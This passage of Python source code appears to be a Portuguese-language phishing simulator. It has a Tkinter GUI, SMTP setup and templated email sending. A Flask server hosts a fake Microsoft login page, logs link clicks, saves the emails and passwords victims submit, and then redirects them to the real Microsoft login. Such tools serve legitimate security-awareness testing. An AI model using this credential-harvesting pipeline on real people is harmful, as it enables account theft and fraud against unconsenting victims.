            entrada_servidor.grid(row=idx + 1, column=1, padx=10, pady=5, sticky="w")
            entradas.append(entrada_servidor)

        elif label == "Porto":
            entrada_porto = ttk.Combobox(janela_criacao, width=38, font=fonte_padrao, state="readonly", values=["25", "465", "587"])  # Ajusta o tamanho, apenas leitura
            entrada_porto.grid(row=idx + 1, column=1, padx=10, pady=5, sticky="w")
            
            # Remove visualmente qualquer seleção de texto após a escolha de uma opção
            def limpar_selecao(event):
                entrada_porto.selection_clear()  # Remove a seleção de texto
            
            # Associa o evento de alteração de valor
            entrada_porto.bind("<<ComboboxSelected>>", limpar_selecao)
            entradas.append(entrada_porto)

        elif label == "Email":
            entrada_email = tk.Entry(janela_criacao, width=40, font=fonte_padrao)
            entrada_email.grid(row=idx + 1, column=1, padx=10, pady=5, sticky="w")
            entrada_email.focus_set()
            entradas.append(entrada_email)
        
        elif label == "Password":
            entrada_password = tk.Entry(janela_criacao, width=30, font=fonte_padrao, show="*")  # show="*" para ocultar por padrão
            entrada_password.grid(row=idx + 1, column=1, padx=10, pady=5, sticky="w")
            entradas.append(entrada_password)
            # Adiciona o botão para mostrar ou ocultar a visibilidade da password
            visibilidade = tk.Button(janela_criacao, width=8, font=fonte_padrao, text="Mostrar", command=mostrarocultar_password)
            visibilidade.grid(row=idx + 1, column=1, padx=230, pady=5, sticky="w")

        else:
            # Cria campos para os outros labels (informações)
            entrada = tk.Entry(janela_criacao, width=40, font=fonte_padrao)
            entrada.grid(row=idx + 1, column=1, padx=10, pady=5, sticky="w")
            entradas.append(entrada)

    # Valida formato do endereço de email
    def formato_email():
        if not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', entrada_email.get().strip()): # Strip é para remover espaços em branco
            return False  # Retorna False se o e-mail é inválido
        else:
            return True  # Retorna True se o e-mail é válido
        
    # Validar dados
    def validacoes(entrada_email, entrada_password, entrada_servidor, entrada_porto):

        # Valida email
        if not formato_email():  # Se o e-mail é válido ou inválido
            messagebox.showerror("Erro", "Email inválido. Valide por favor!")
        else:
            if not(entrada_email and entrada_password and entrada_servidor and entrada_porto): # Valida se todos os campos estão preenchidos
                messagebox.showerror("Erro", "Existem campos por preencher. Valide por favor!")
            else:
                # Faz o envio de teste, sendo o destinatário o próprio endereço de email utilizado para login na conta
                assunto = "Simulação de Phishing"
                msg = "Esta é uma mensagem de teste de um ataque de phishing."

                # Trata cada variável, para garantir que não existem espaços (e caracteres de nova linha, tabulação, etc.) no início e no final de cada string
                global email, password, servidor, porto # Declarar variável global
                servidor = entrada_servidor.strip()
                porto = entrada_porto.strip()
                porto = int(entrada_porto) # Converte de string para número inteiro
                email = entrada_email.strip()
                password = entrada_password.strip()
                resultado = enviaEmail(servidor, porto, email, password, email, assunto, msg) #Envia o email

                if resultado[0] == 0:
                    messagebox.showerror("Erro", resultado[1])
                else:
                    messagebox.showinfo("Sucesso", resultado[1])
                    time.sleep(1) # Espera de x segundos. Para não surgir logo a próxima mensagem

                    # Questiona se pretende guardar as configurações
                    resposta = messagebox.askyesno("Configuração", "Deseja guardar as configurações?")
                    if resposta:  # Se "Sim"
                        time.sleep(1) # Espera de x segundo. Para não surgir logo a próxima mensagem

                        # Atualiza o status como "ativo"
                        atualizar_status_smtp("ativo")
                        fechar() # Executa a função fechar, para fechar a janela
                        messagebox.showinfo("Informação", "Configuração Guardada!")
                        opcaoemail()

                    else:  # Se "Não" - Limpa as variáveis
                        email = ""
                        password = ""
                        servidor = ""
                        porto = ""
                        messagebox.showinfo("Informação", "Configuração Não Guardada!")
                        
    
    # Cancelar/fechar a configuração
    def fechar():
        global janela_criacao
        janela_criacao.destroy()  # Fecha a janela de criação sem guardar
        janela_criacao = None  # Limpa a referência da janela global

    # Botões de Testar e Cancelar
    btn_testar = tk.Button(janela_criacao, text="Testar", command=lambda: validacoes(entrada_email.get(), entrada_password.get(), entrada_servidor.get(), entrada_porto.get()), bg=cor_botao, fg="white", font=fonte_padrao, padx=10, pady=5, relief="flat")
    btn_testar.grid(row=len(labels) + 1, column=0, padx=10, pady=(10, 20), sticky="w")

    btn_cancelar = tk.Button(janela_criacao, text="Cancelar", command=fechar, bg=cor_botao, fg="white", font=fonte_padrao, padx=10, pady=5, relief="flat")
    btn_cancelar.grid(row=len(labels) + 1, column=1, padx=220, pady=(10, 20), sticky="w")

    # Adiciona eventos de hover nos botões
    btn_testar.bind("<Enter>", on_enter)
    btn_testar.bind("<Leave>", on_leave)
    btn_cancelar.bind("<Enter>", on_enter)
    btn_cancelar.bind("<Leave>", on_leave)

### Conteúdo Janela
# Mostra conteúdo na área principal (ex: mensagens), para não ter que repetir a mesma label em vários locais
def mostrar_conteudo(conteudo):
    for widget in frame_conteudo.winfo_children():
        widget.destroy()

    # Caso seja necessário enviar alguma informação, como "Sem informação disponível" no ecrã principal, a label mostra esse conteúdo
    label_conteudo = tk.Label(frame_conteudo, text=conteudo, font=fonte_padraoMensagensAlerta, justify="left", bg=cor_labelfundoMenu)
    label_conteudo.pack(padx=20, pady=10, anchor="nw")
    
### Menu
# Alternar o modo de mostrar do menu (mostrar ou ocultar)
def alternar_menu():
    if frame_menu.winfo_ismapped():  # Verifica se o menu está visível
        frame_menu.grid_forget()  # Remove o menu da janela
        frame_conteudo.grid_columnconfigure(0, weight=1)  # Ajusta o conteúdo para ocupar toda a largura
        frame_conteudo.grid_columnconfigure(1, weight=0)  # Impede que o conteúdo ocupe a área onde o menu estava
    else:
        frame_menu.grid(row=1, column=0, rowspan=2, sticky="ns")  # mostra novamente o menu lateral
        frame_conteudo.grid_columnconfigure(0, weight=0)  # Impede que o conteúdo ocupe toda a largura
        frame_conteudo.grid_columnconfigure(1, weight=1)  # Deixa o conteúdo expandir na área restante
        # Garante que a área de conteúdo se ajusta quando o menu é mostrado
        frame_conteudo.grid_rowconfigure(0, weight=1)  # Permite que o conteúdo principal se expanda verticalmente
        frame_conteudo.grid_columnconfigure(0, weight=1)  # Permite que o conteúdo se expanda horizontalmente
        frame_conteudo.grid_columnconfigure(1, weight=0)  # Ajuste necessário para evitar colunas extras
# Fechar o programa
def fechar_programa():
    if messagebox.askokcancel("Sair", "Deseja realmente fechar?"):
        inativarServidorWeb() # Desliga o serviço/servidor web
        root.destroy() # Fecha a aplicação

### Servidor Web
# Executa o servidor Flask em segundo plano
class FlaskThread(threading.Thread):

    def __init__(self):
        global appWeb # Variável Servidor Web
        threading.Thread.__init__(self)
        self.statusServidorWeb = make_server(enderecoWeb, portaEnderecoWeb, appWeb) # Endereço e porta onde é executado o Flask
        self.context = appWeb.app_context()
        self.context.push()

    def run(self):
        self.statusServidorWeb.serve_forever()

    def stop(self):
        self.statusServidorWeb.shutdown()
# Servidor Web (Flask) - Principais configurações
def ServidorWeb():
    global appWeb # Variável Servidor Web

    appWeb = Flask(__name__) # Nome serviço web: appWeb

    # Rota para redirecionar para a página 'Default.html'
    @appWeb.route('/')
    def index():
        return render_template('Default.html') 

    # Rota para redirecionar para a página 'Microsoft.html'
    @appWeb.route('/Microsoft.html')
    def microsoft():
        clientID = request.args.get('client_id')  # Obtém o valor do parâmetro client_id
        
        # Verifica se o clientID está presente e não está vazio
        if clientID:
            # Atualiza o registo na base de dados para indicar que o link foi clicado
            from BaseDados.Querys import atualizar_linkclicado
            atualizar_linkclicado(clientID)
            return render_template('Microsoft.html', clientID=clientID) # Retorna a página Microsoft com o clientID
        else:
            # Retorna a página Microsoft com o clientID vazio e a página destino trata de redirecionar
            return render_template('Microsoft.html', clientID=clientID)

    # Rota para o POST da página WEB
    @appWeb.route('/submit', methods=['POST']) 
    def submit():
        email = request.form.get('email')  # Obtém o valor do campo email
        password = request.form.get('password')  # Obtém o valor do campo password
        clientID = request.form.get('clientID')  # Obtém o valor do campo clientID
        
        if email and password and clientID:

            # Guarda na BD os dados
            from BaseDados.Querys import atualizar_dados
            atualizar_dados(clientID, email, password)
            
            # Redireciona o utilizador para a página de login verdadeira
            return redirect("https://login.microsoftonline.com")
        else:
            return "Por favor, preencha todos os campos."
# ATIVAR Servidor Web (Flask)
def ativarServidorWeb():

    # Executa a função Servidor WEB, para executar/chamar as principais funções
    ServidorWeb()

    # Inicia o servidor Flask numa thread separada
    global statusServidorWeb, statusServidorWebThread
    if statusServidorWebThread is None or not statusServidorWebThread.is_alive():
        statusServidorWebThread = FlaskThread()
        statusServidorWebThread.start()
        label_status_servidorweb.config(text="✓ Servidor Web Ativo", bg="green") # Altera a cor da label
        botao_ServidorWeb.config(text="Inativar Servidor Web", command=inativarServidorWeb) # Altera o texto do botão e o comando do botão, para fazer a função contrária: Inativar
        messagebox.showinfo("Ativação Servidor Web", "Servidor iniciado em http://" + enderecoWeb + ":" + str(portaEnderecoWeb))
# INATIVAR Servidor Web (Flask)
def inativarServidorWeb():
    global appWeb # Variável Servidor Web

    global statusServidorWebThread
    if statusServidorWebThread and statusServidorWebThread.is_alive():
        statusServidorWebThread.stop()
        statusServidorWebThread.join()  # Aguarda o fecho da thread
        statusServidorWebThread = None
        label_status_servidorweb.config(text="✗ Servidor Web Inativo", bg="red") # Altera a cor da label
        botao_ServidorWeb.config(text="Ativar Servidor Web", command=ativarServidorWeb) # Altera o texto do botão e o comando do botão, para fazer a função contrária: Ativar
        #messagebox.showinfo("Inativação Servidor Web", "Servidor Web parado.")

### Opção Menu: Enviar Email
def opcaoemail():

    # Limpa o conteúdo anterior da janela
    for widget in frame_conteudo.winfo_children():
        widget.destroy()

    global statusSMTP
    if statusSMTP == 0: # Caso o status do serviço SMTP esteja inativo, mostra a mensagem
        mostrar_conteudo("Serviço SMTP em estado inativo. Configure-o para ter acesso a esta funcionalidade.")
    else:
        for widget in frame_conteudo.winfo_children():
            widget.destroy()

        # Destino
        label_Destino = tk.Label(frame_conteudo, text="Destinatário", font=fonte_padrao, justify="left", bg=cor_labelfundoMenu)
        label_Destino.pack(padx=20, pady=10, anchor="nw")
        input_Destino = tk.Entry(frame_conteudo, width=40, font=fonte_padrao)
        input_Destino.pack(padx=20, pady=0, anchor="nw")
        input_Destino.focus_set()

        # Templates de Páginas Falsas
        label_PaginaFalsa = tk.Label(frame_conteudo, text="Página Falsa", font=fonte_padrao, justify="left", bg=cor_labelfundoMenu)
        label_PaginaFalsa.pack(padx=20, pady=10, anchor="nw")
        opcoes = ["Microsoft"]  # Lista de opções (Templates Páginas Falsas)
        combobox_PaginaFalsa = ttk.Combobox(frame_conteudo, values=opcoes, width=40, font=fonte_padrao, state="readonly")  # Apenas Leitura
        combobox_PaginaFalsa.pack(padx=20, pady=0, anchor="nw")
        combobox_PaginaFalsa.set("Escolha uma opção") # Define um valor padrão para surgir ao utilizador           
        def limpar_selecaoPaginaFalsa(event): # Remove visualmente qualquer seleção de texto após a escolha de uma opção
            combobox_PaginaFalsa.selection_clear()  # Remove a seleção de texto
        combobox_PaginaFalsa.bind("<<ComboboxSelected>>", limpar_selecaoPaginaFalsa) # Associa o evento de alteração de valor

        # Templates de Envio Email
        label_EmailEnviar = tk.Label(frame_conteudo, text="Conteúdo Email a Enviar", font=fonte_padrao, justify="left", bg=cor_labelfundoMenu)
        label_EmailEnviar.pack(padx=20, pady=10, anchor="nw")
        opcoes_EmailEnviar = {item[1]:(item[0],item[2],item[3]) for item in select_TemplatesEmailEnvioEmail()}  # Dicionário com a lista de opções (Email a Enviar). Contruído com "for", para não surgir "{}" nos valores
        opcoes = list(opcoes_EmailEnviar.keys()) # Lista o segundo valor do dicionário, neste caso o nome do Template ( item[1] ) e não o seu ID ou outro valor
        combobox_EmailEnviar = ttk.Combobox(frame_conteudo, values=opcoes, width=40, font=fonte_padrao, state="readonly")  # Apenas Leitura
        combobox_EmailEnviar.pack(padx=20, pady=0, anchor="nw")
        combobox_EmailEnviar.set("Escolha uma opção") # Define um valor padrão para surgir ao utilizador           
        def limpar_selecaoEmailEnviar(event): # Remove visualmente qualquer seleção de texto após a escolha de uma opção
            combobox_EmailEnviar.selection_clear()  # Remove a seleção de texto
        combobox_EmailEnviar.bind("<<ComboboxSelected>>", limpar_selecaoEmailEnviar) # Associa o evento de alteração de valor

        # Faz as validações necessárias de todos os campos e se OK, faz o envio
        def validacoes():

            input_Email = input_Destino.get().strip() # Strip é para remover espaços em branco
    
            # Divide os emails por vírgula ou ponto e vírgula e remover espaços extras
            emails = [email.strip() for email in re.split(r'[;,]', input_Email) if email.strip()]
            
            # Se há mais de um e-mail
            if len(emails) > 1:
                messagebox.showinfo("Múltiplos emails", "Não é permitido vários endereços de email.\nInsira apenas um endereço de email.")
                input_Destino.focus_set()
                return
            # Se o e-mail é inválido
            elif not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', input_Email): 
                messagebox.showinfo("Email inválido", "Endereço de Email inválido.\nDeve utilizar o formato: endereco@dominio.pt")
                input_Destino.focus_set()
                return
            # Se foi escolhida uma opção de página falsa
            elif combobox_PaginaFalsa.get() == "Escolha uma opção":
                messagebox.showinfo("Página Falsa", "Página falsa inválida. Escolha uma opção.")
                combobox_PaginaFalsa.focus_set()
                return
            # Se foi escolhida uma opção de conteúdo de email a enviar
            elif combobox_EmailEnviar.get() == "Escolha uma opção":
                messagebox.showinfo("Email Envio", "Conteúdo do email a enviar inválido. Escolha uma opção.")
                combobox_EmailEnviar.focus_set()
                return
            # Passou todas as validações, então continua com o processo
            else:
                #E-mail é válido
                infoPaginaFalsa = combobox_PaginaFalsa.get() # Obtem o valor escolhido da página falsa
                infoEmailEnviar = opcoes_EmailEnviar.get(combobox_EmailEnviar.get()) # Obtem o ID conforme o dicionário e respetivo registo escolhido na combobox
                if infoEmailEnviar and infoPaginaFalsa: # Se recebe as informações

                    # Cria o registo na tabela de Credenciais
                    idRegistoBD = insereDadosCredenciais(input_Email, infoPaginaFalsa)

                    # Constrói a página final a ser implementada no URL do email a enviar
                    paginafalsa = "http://" + enderecoWeb + ":" + str(portaEnderecoWeb) + "/" + infoPaginaFalsa + ".html?client_id=" + idRegistoBD 

                    # O "id" é necessário para identificar o registo da tabela de template de emails
                    id, assunto, conteudo = infoEmailEnviar # Define que os dados de cada item são obtidos a partir da info obtida da combobox Email a Enviar

                    # Substituição das variáveis pelo conteúdo pretendido
                    conteudo = conteudo.replace("#email#", input_Email) # Substitui a variável pelo email do destinatário
                    conteudo = conteudo.replace("#endereco#", paginafalsa)

                    # Faz o envio do email para o destinatário e valida o resultado
                    resultado = enviaEmail(servidor, porto, email, password, input_Email, assunto, conteudo)

                    if resultado[0] == 0:
                        messagebox.showerror("Erro", resultado[1])
                        return
                    else:
                        messagebox.showinfo("Sucesso", resultado[1])
                        opcaoemail()
                        return
                    
        
        # Botão Enviar Email
        botao_Enviar = tk.Button(frame_conteudo, text="Enviar", font=fonte_padrao, bg=cor_botao, fg="white", relief="flat", command=validacoes)
        botao_Enviar.pack(pady=10, padx=20, anchor="nw")


### Opção Menu: INFO
def opcaoinfo():
    
    # Limpa o conteúdo anterior da janela
    for widget in frame_conteudo.winfo_children():
        widget.destroy()

    # Le o conteúdo do ficheiro HTML
    def html(ficheiro):
        with open(ficheiro, "r", encoding="utf-8") as f:
            return f.read()
    
    # Cria frame HTML utilizando o tkinterweb, mas esconde mensagens de debug
    framehtml = HtmlFrame(frame_conteudo, messages_enabled = False) 
    framehtml.pack(fill="both", expand=True)
        
    # Conteúdo do ficheiro HTML a ser lido, na raiz do projeto
    conteudoHtml = html("Info.html")

    # Carrega o HTML no frame
    framehtml.load_html(conteudoHtml)


# Criação da janela principal
root = tk.Tk()
root.title("Simulador de Phishing")

# Centra a janela principal
largura = 1024
altura = 600
largura_janela = root.winfo_screenwidth()
altura_janela = root.winfo_screenheight()
pos_x = (largura_janela // 2) - (largura // 2)
pos_y = (altura_janela // 2) - (altura // 2)
root.geometry(f"{largura}x{altura}+{pos_x}+{pos_y}")

# Estilos
style = ttk.Style()
style.theme_use("clam")  # Tema a utilizar. Utilização de um tema mais moderno
style.configure("TButton", font=fonte_padraoMenu, padding=6)

# Frame do topo para o botão de alternar menu
frame_top = tk.Frame(root, bg="#333333", height=40)
frame_top.grid(row=0, column=0, columnspan=2, sticky="ew")

# Botão para alternar o menu
botao_toggle = tk.Button(frame_top, text="☰", font=fonte_padraobotaoMenu, command=alternar_menu, relief="flat", bg=cor_botaoMenu, fg=cor_botaofundoMenu)
botao_toggle.grid(row=0, column=0, padx=5, pady=5, sticky="w")  # Alinhado à esquerda
# Adiciona eventos de hover nos botões
botao_toggle.bind("<Enter>", on_enterMenu)
botao_toggle.bind("<Leave>", on_leaveMenu)

# Label de status Servidor WEB (na ponta direita do frame_top)
label_status_servidorweb = tk.Label(frame_top, text="✗ Servidor Web Inativo", font=(fonte_padraobotaoMenu, 8), fg="white", bg="red", padx=10, pady=5)
label_status_servidorweb.grid(row=0, column=1, padx=120, pady=5, sticky="e")  # Alinhado à direita

# Label de status SMTP (na ponta direita do frame_top)
label_status_smtp = tk.Label(frame_top, text="✗ SMTP Inativo", font=(fonte_padraobotaoMenu, 8), fg="white", bg="red", padx=10, pady=5)
label_status_smtp.grid(row=0, column=1, padx=10, pady=5, sticky="e")  # Alinhado à direita

# Configura o frame_top para expandir corretamente
frame_top.grid_columnconfigure(0, weight=1)  # Permite que o botão de menu ocupe espaço restante
frame_top.grid_columnconfigure(1, weight=0)  # Mantém o label de status fixo à direita


# Frame do menu lateral
frame_menu = tk.Frame(root, bg=cor_fundoMenu, width=200)
frame_menu.grid(row=1, column=0, rowspan=2, sticky="ns")

### Botões do menu (a utilizar grid ao invés de pack)
# Botão inicial
botao_inicio = tk.Button(frame_menu, text="Informação", font=fonte_padraobotaoMenu, bg=cor_botaoMenu, fg=cor_botaofundoMenu, relief="flat", command=opcaoinfo)
botao_inicio.grid(row=0, column=0, sticky="ew", pady=3)
# Adiciona eventos de hover nos botões
botao_inicio.bind("<Enter>", on_enterMenu)
botao_inicio.bind("<Leave>", on_leaveMenu)

# Botão Enviar Email
botao_enviar_email = tk.Button(frame_menu, text="Enviar E-mail", font=fonte_padraobotaoMenu, bg=cor_botaoMenu, fg=cor_botaofundoMenu, relief="flat",command=opcaoemail)
botao_enviar_email.grid(row=1, column=0, sticky="ew", pady=3)
# Adiciona eventos de hover nos botões
botao_enviar_email.bind("<Enter>", on_enterMenu)
botao_enviar_email.bind("<Leave>", on_leaveMenu)

# Botão Credenciais obtidas
botao_logins = tk.Button(frame_menu, text="Credenciais", font=fonte_padraobotaoMenu, bg=cor_botaoMenu, fg=cor_botaofundoMenu, relief="flat", command=Credenciais)
botao_logins.grid(row=2, column=0, sticky="ew", pady=3)
# Adiciona eventos de hover nos botões
botao_logins.bind("<Enter>", on_enterMenu)
botao_logins.bind("<Leave>", on_leaveMenu)

# Botão Templates Email
botao_templates = tk.Button(frame_menu, text="Templates", font=fonte_padraobotaoMenu, bg=cor_botaoMenu, fg=cor_botaofundoMenu, relief="flat", command=TemplatesEmail)
botao_templates.grid(row=3, column=0, sticky="ew", pady=3)
# Adiciona eventos de hover nos botões
botao_templates.bind("<Enter>", on_enterMenu)
botao_templates.bind("<Leave>", on_leaveMenu)


# Botão de Ativar ou Inativar Servidor Web
botao_ServidorWeb = tk.Button(frame_menu, text="Ativar Servidor Web", font=fonte_padraobotaoMenu, command=ativarServidorWeb, relief="flat", bg=cor_botaoMenu, fg=cor_botaofundoMenu)
botao_ServidorWeb.grid(row=8, column=0, sticky="ew", pady=3)  # Colocado antes do botão Configurações
# Adiciona eventos de hover nos botões
botao_ServidorWeb.bind("<Enter>", on_enterMenu)
botao_ServidorWeb.bind("<Leave>", on_leaveMenu)

# Botão de Configurações
botao_Configs = tk.Button(frame_menu, text="Configurar SMTP", font=fonte_padraobotaoMenu, command=configuracoes, relief="flat", bg=cor_botaoMenu, fg=cor_botaofundoMenu)
botao_Configs.grid(row=9, column=0, sticky="ew", pady=3)  # Colocado antes do botão sair
# Adiciona eventos de hover nos botões
botao_Configs.bind("<Enter>", on_enterMenu)
botao_Configs.bind("<Leave>", on_leaveMenu)

# Botão de SAIR - Posicionado no fundo do menu lateral
botao_fechar = tk.Button(frame_menu, text="Sair", font=fonte_padraobotaoMenu, command=fechar_programa, relief="flat", bg=cor_botaoMenu, fg=cor_botaofundoMenu)
botao_fechar.grid(row=10, column=0, sticky="ew", pady=3)  # Colocado após os outros botões
# Adiciona eventos de hover nos botões
botao_fechar.bind("<Enter>", on_enterMenu)
botao_fechar.bind("<Leave>", on_leaveMenu)

# Ajuste de espaçamento para garantir que o botão "Fechar" fique no fundo
frame_menu.grid_rowconfigure(6, weight=1)  # Assegura que a última linha ocupa o espaço restante

# Frame para mostrar o conteúdo principal
frame_conteudo = tk.Frame(root, bg=cor_fundoConteudoMenu)
frame_conteudo.grid(row=1, column=1, sticky="nsew")

# Configuração para expandir o conteúdo corretamente
root.grid_rowconfigure(0, weight=0)
root.grid_rowconfigure(1, weight=1)
root.grid_columnconfigure(0, weight=0)
root.grid_columnconfigure(1, weight=1)

# Configuração para validar o fecho da janela, caso o utilizador clique no "X" da janela
root.protocol("WM_DELETE_WINDOW", fechar_programa)

opcaoinfo() # Iniciar a aplicação com o conteúdo pretendido

# Inicia a aplicação
root.mainloop()
